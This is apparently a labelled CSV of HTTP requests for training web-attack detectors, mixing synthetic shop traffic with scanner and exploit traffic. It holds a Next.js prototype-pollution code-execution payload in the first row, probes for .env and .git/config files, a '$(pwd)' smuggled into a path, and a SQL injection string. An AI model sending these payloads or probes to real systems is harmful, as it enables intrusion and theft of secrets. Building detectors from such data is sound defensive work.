text_input,method,url_path,query_params,request_payload,user_agent,response_status,label,attack_type,source
"POST /_next [SEP]  ------WebKitFormBoundaryx148346160661
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 100127+true+1481580;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx148346160661
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx148346160661
------WebKitFormBoundaryx148346160661-- [SEP] Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/134.0.6998.99 Mobile/15E148 Safari/604.1 [SEP]     ",POST,/_next,,"------WebKitFormBoundaryx148346160661
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B\""}"",""_response"":{""_prefix"":""r = 100127+true+1481580;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundaryx148346160661
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundaryx148346160661
------WebKitFormBoundaryx148346160661--","Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/134.0.6998.99 Mobile/15E148 Safari/604.1",404,1,sqli,loki_exp1
POST /tienda1/publico/anadir.jsp [SEP]  id=2&nombre=Queso+Manchego&precio=85&cantidad=88&B1=A%F1adir+al+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=0B8FB0FB0294C6E5A7251030EC265B5B localhost:8080  ,POST,/tienda1/publico/anadir.jsp,,id=2&nombre=Queso+Manchego&precio=85&cantidad=88&B1=A%F1adir+al+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=1&nombre=Queso+Manchego&precio=100&cantidad=63&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=22DD027D456D66A07AD333DB309ECAF6 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=1&nombre=Queso+Manchego&precio=100&cantidad=63&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/nuestratierra.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=849F503C03EE807E519387AA30DCB527 localhost:8080  ,GET,/tienda1/imagenes/nuestratierra.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /favicon.ico [SEP]   [SEP] Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0 [SEP]     ,GET,/favicon.ico,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0,404,1,scanning,loki_exp1
GET /tienda1/publico/productos.jsp/6909030637832563290.jsp.inc [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=0C5F7264F346307D2C622C4661A5E36D localhost:8080  ,GET,/tienda1/publico/productos.jsp/6909030637832563290.jsp.inc,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /WebSphereSamples/SingleSamples/AccountAndTransfer/create.html [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=B215E70CA558BF9247BD77B63C6487E8 localhost:8080  ,GET,/WebSphereSamples/SingleSamples/AccountAndTransfer/create.html,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /theme [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=05DD4D8B6C2933A1BF55830FE7646EFE localhost:8080  ,GET,/theme,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /new-js/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/new-js/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=andruzzi&password=58c058ars4&nombre=Pampa&apellidos=Robles+Arteaga&email=blomfield%40enlanzarote.com.al&dni=00712854S&direccion=Calle+Bergueda+5%2C+5%3FD&ciudad=Fonsagrada%2C+A&cp=28729&provincia=Salamanca&ntc=5427036195556826&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=933D79682E9D48525AA59AF7D8BAFBA0 localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=andruzzi&password=58c058ars4&nombre=Pampa&apellidos=Robles+Arteaga&email=blomfield%40enlanzarote.com.al&dni=00712854S&direccion=Calle+Bergueda+5%2C+5%3FD&ciudad=Fonsagrada%2C+A&cp=28729&provincia=Salamanca&ntc=5427036195556826&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/6909030637832563290.jsp~ [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C0A60401A51A48F50AF885D247B91203 localhost:8080  ,GET,/tienda1/6909030637832563290.jsp~,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/fotos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=5274888F539AD844CF359D2484447A11 localhost:8080  ,GET,/tienda1/miembros/fotos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/1.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=7A4FB4B0599FDBD806797F30F0E6B83A localhost:8080  ,GET,/tienda1/imagenes/1.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/global/creditos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=19323C9B8F6E3C4ACD7646CDB7F02C1B localhost:8080  ,GET,/tienda1/global/creditos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/editar.jsp [SEP] modo=registro&login=faraday&password=8Ef6NDo&nombre=Xixia&apellidos=Paula+Pladellorens&email=euzaine%40schnapps.com.gs&dni=85744372G&direccion=Santa+Barbara+28+&ciudad=Cenicientos&cp=22232&provincia=Lugo&ntc=7057231009442608&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=85CFAD63257F87EE1941641B493382B1 localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=registro&login=faraday&password=8Ef6NDo&nombre=Xixia&apellidos=Paula+Pladellorens&email=euzaine%40schnapps.com.gs&dni=85744372G&direccion=Santa+Barbara+28+&ciudad=Cenicientos&cp=22232&provincia=Lugo&ntc=7057231009442608&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=1510&B1A=Confirmar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=28F2D250BB5BFBE99281F37DE493D7E9 localhost:8080  ,POST,/tienda1/publico/pagar.jsp,,modo=insertar&precio=1510&B1A=Confirmar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /market/.env.staging [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/market/.env.staging,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/anadir.jsp [SEP] id=1&nombre=Vino+Rioja&precio=100&cantidad=43&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=2BDD7F49EB949BFCC8AAB063BC5E9E92 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Rioja&precio=100&cantidad=43&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
PUT /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=jessamin&password=entera&nombre=Miy%E9n&apellidos=Agundis+Depalol&email=bonner%40926.dm&dni=22787443D&direccion=Probintzietako%2C+3+10%3FD&ciudad=Sils&cp=47686&provincia=Girona&ntc=7246879991228757&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=652DEAE0EF29DC19CC2FC7AB0F275CC0 localhost:9090  ,PUT,/tienda1/miembros/editar.jsp,,modo=registro&login=jessamin&password=entera&nombre=Miy%E9n&apellidos=Agundis+Depalol&email=bonner%40926.dm&dni=22787443D&direccion=Probintzietako%2C+3+10%3FD&ciudad=Sils&cp=47686&provincia=Girona&ntc=7246879991228757&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=raymona&password=8ho0l2&nombre=Torcuarto&apellidos=Pompa&email=maksimovic%40gafasdesol.nom.gl&dni=48748000Y&direccion=Port+Fangos%2C+183%2C+&ciudad=Cualedro&cp=31153&provincia=Granada&ntc=9528500439395561&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=D99D82411B050648A42AA177F3BBBBAB localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=raymona&password=8ho0l2&nombre=Torcuarto&apellidos=Pompa&email=maksimovic%40gafasdesol.nom.gl&dni=48748000Y&direccion=Port+Fangos%2C+183%2C+&ciudad=Cualedro&cp=31153&provincia=Granada&ntc=9528500439395561&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /.env.staging [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/.env.staging,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/global/titulo.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=F13BBCD8F99C5A18E1D65589CB8E5CBC localhost:8080  ,GET,/tienda1/global/titulo.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/vaciar.jsp [SEP]  B2=Vaciar+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=8FF32D64B3677634D6BA4BAC61F260DF localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2=Vaciar+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/salir.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=68ECABB1AE44AE214B27EA509C68C738 localhost:8080  ,GET,/tienda1/miembros/salir.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/imagenes/ogono.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=639F055DBBB010EA548CB8602F687976 localhost:8080  ,GET,/tienda1/miembros/imagenes/ogono.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/fotos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=37BCA609C365322608FD255E6DA90868 localhost:8080  ,GET,/tienda1/miembros/fotos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/1.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=D21D3A4FC0CEF949B26BDFAC956D4F79 localhost:8080  ,GET,/tienda1/imagenes/1.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=kube9&pwd=38r20NvE1e9&remember=on%2F&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=D2ED26A09D0478D01A8F99C1D6B7953C localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=kube9&pwd=38r20NvE1e9&remember=on%2F&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/imagenes/2.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=A8DC52818F856768422D7B585E2D8841 localhost:8080  ,GET,/tienda1/imagenes/2.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/caracteristicas.jsp [SEP]  id=1 [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=8DC73C6AFFB8AD008C6E1F3804A086CC localhost:8080  ,POST,/tienda1/publico/caracteristicas.jsp,,id=1,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=2&nombre=%22+AND+%221%22%3D%221&precio=85&cantidad=90&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=16E488DDD88145AF05A9769079C9F043 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=2&nombre=%22+AND+%221%22%3D%221&precio=85&cantidad=90&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/entrar.jsp [SEP] errorMsg=Credenciales+incorrectas  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=CC3F9CD9AC97294A5A80FE19A313EB02 localhost:8080  ,GET,/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/productos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=E0D3D800E09FC06629326A427DAB8A3A localhost:8080  ,GET,/tienda1/publico/productos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/fotos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=7B6BAE51E173A86E632EC99736C04F98 localhost:8080  ,GET,/tienda1/miembros/fotos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /en/.git/config [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/en/.git/config,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/vaciar.jsp [SEP] B2A=Vaciar+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=AFB9F70F91DDD5109095FA0B63C93CFA localhost:8080  ,GET,/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /admin/settings.php [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/admin/settings.php,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=terrye&password=lombriguera&nombre=Policarpa&apellidos=Susanibar+Nolla&email=%40lasalle%40cartasdeajuste.hn&dni=40604241H&direccion=Avda.+Del+Municipi%2C+45%2C+&ciudad=Arona&cp=19144&provincia=M%E1laga&ntc=4253633913747340&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=A797CF88D14862E9A6EE2A67B881C39E localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=terrye&password=lombriguera&nombre=Policarpa&apellidos=Susanibar+Nolla&email=%40lasalle%40cartasdeajuste.hn&dni=40604241H&direccion=Avda.+Del+Municipi%2C+45%2C+&ciudad=Arona&cp=19144&provincia=M%E1laga&ntc=4253633913747340&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/pagar.jsp [SEP] modo=insertar&precio=%2B&B1=Pasar+por+caja  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=BF76C00A666251039A76AA1F8907641C localhost:8080  ,GET,/tienda1/publico/pagar.jsp,modo=insertar&precio=%2B&B1=Pasar+por+caja,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar&login=akbas3&pwdA=6r6s1arr%E17&remember=on&B1=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=3D473F93B07D441B1F0F5276291A34BF localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar&login=akbas3&pwdA=6r6s1arr%E17&remember=on&B1=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/vaciar.jsp.Old [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=15699294B7BA94129B74C583AA358C85 localhost:8080  ,GET,/tienda1/publico/vaciar.jsp.Old,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/imagenes/nuestratierra.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=3D774506F02AB680E79B8E5E73F1A8BA localhost:8080  ,GET,/tienda1/imagenes/nuestratierra.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/global/asf-logo-wide [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=4C79C39931431C4FDECF7AF6765E888A localhost:8080  ,GET,/tienda1/global/asf-logo-wide,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /$(pwd)/netlify.toml [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/$(pwd)/netlify.toml,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /backend/admin/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/backend/admin/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/anadir.jsp [SEP] id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=78&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=2B5D890C2E1B304CA7A5CD775CA32A02 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=78&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/global/titulo.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=19FD49E75CCA2E9A4CD4FFA809DAC4D7 localhost:8080  ,GET,/tienda1/global/titulo.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=france&password=r%2F%2Cequis%27a&nombre=Reeve&apellidos=Aca+Isach&email=miravalles_kaa%40castigadas.tm&dni=94863540V&direccion=Calle+368+35+&ciudad=Villahoz&cp=45571&provincia=Segovia&ntc=3908296884396301&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=AD6CC631C389E81901701DAAE5E7E7BB localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=france&password=r%2F%2Cequis%27a&nombre=Reeve&apellidos=Aca+Isach&email=miravalles_kaa%40castigadas.tm&dni=94863540V&direccion=Calle+368+35+&ciudad=Villahoz&cp=45571&provincia=Segovia&ntc=3908296884396301&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /public/.env.jpg [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/public/.env.jpg,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar&login=carmelo&pwd=pREcis*A&remember=off&B1A=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=6EEB7A079DED15E90A5B0D73D502707B localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar&login=carmelo&pwd=pREcis*A&remember=off&B1A=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/imagenes/nuestratierra.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=4B3ADA7090685F0CD6EDE17E22E87D22 localhost:8080  ,GET,/tienda1/imagenes/nuestratierra.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/anadir.jsp [SEP]  id=1&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=78&B1=A%F1adir+al+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=993D111B27779D3AC5A38BA061CB3CC3 localhost:8080  ,POST,/tienda1/publico/anadir.jsp,,id=1&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=78&B1=A%F1adir+al+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
PUT /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=6992&B1=Confirmar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=7701B081395B74366531F56E0A62401B localhost:9090  ,PUT,/tienda1/publico/pagar.jsp,,modo=insertar&precio=6992&B1=Confirmar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /insta-compose.yml [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/insta-compose.yml,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/imagenes/2.gif [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=5F32EF88BBB515C98E073BF76CCA9062 localhost:8080  ,GET,/tienda1/imagenes/2.gif,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/anadir.jsp [SEP]  id=3&nombre=Ques%2Bo+Manchego&precio=100&cantidad=82&B1=A%F1adir+al+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=A2EC21ECF91D08C93139162CF8FB9DF1 localhost:8080  ,POST,/tienda1/publico/anadir.jsp,,id=3&nombre=Ques%2Bo+Manchego&precio=100&cantidad=82&B1=A%F1adir+al+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
